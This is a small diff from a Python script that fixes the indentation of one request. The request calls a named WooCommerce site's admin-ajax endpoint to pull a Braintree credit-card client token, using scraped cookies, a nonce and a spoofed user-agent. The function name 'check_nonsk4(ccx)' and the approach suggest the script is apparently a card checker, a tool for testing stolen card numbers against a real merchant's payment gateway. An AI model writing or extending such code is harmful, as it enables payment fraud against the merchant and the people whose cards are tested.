@@ -141,7 +141,7 @@ def check_nonsk4(ccx):
             'action': 'wc_braintree_credit_card_get_client_token',
             'nonce': client,
         }
-                response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers={'user-agent': user}, data=data)
+        response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers={'user-agent': user}, data=data)
         response.raise_for_status()
         enc = response.json().get('data')
         if enc:
